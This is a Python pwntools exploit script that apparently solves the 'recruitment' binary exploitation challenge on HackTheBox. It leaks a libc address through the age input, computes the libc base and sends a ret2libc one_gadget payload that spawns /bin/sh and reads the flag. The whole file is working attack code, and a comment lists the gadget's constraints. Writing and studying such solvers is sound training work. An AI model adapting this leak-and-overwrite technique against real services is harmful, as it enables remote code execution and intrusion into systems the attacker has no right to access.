#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './recruitment' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

r.timeout = 0.5
e = ELF(fname)
libc = ELF('./glibc/libc.so.6')

rl  = lambda     : r.recvline()
ru  = lambda x   : r.recvuntil(x)
sla = lambda x,y : r.sendlineafter(x,y)
sl  = lambda x : r.sendline(x)

# Leak libc address: 
sla('$', '1')
sla('Name:  ', 'w3t')
sla('Class: ', 'h4nds')
p = 'w'*23
sla('Age:   ', p)

# Read junk lines
ru(p)
rl() 

# Calculate libc base
libc.address = u64(rl().strip().ljust(8, b'\x00')) - 0x93bca
print(f'[+] Libc base: {libc.address:#04x}')

# Perform ret2libc attack with one_gadget
sla('$', '3')
sla(':', b'w3th4nds'*5 + p64(libc.address + 0x583e3)) # one_gadget

pause(1)
sl('cat flag*')
print(f'\nFlag --> {r.recvline_contains(b"HTB").strip().decode()}\n')

'''
0x583e3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17302e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL
'''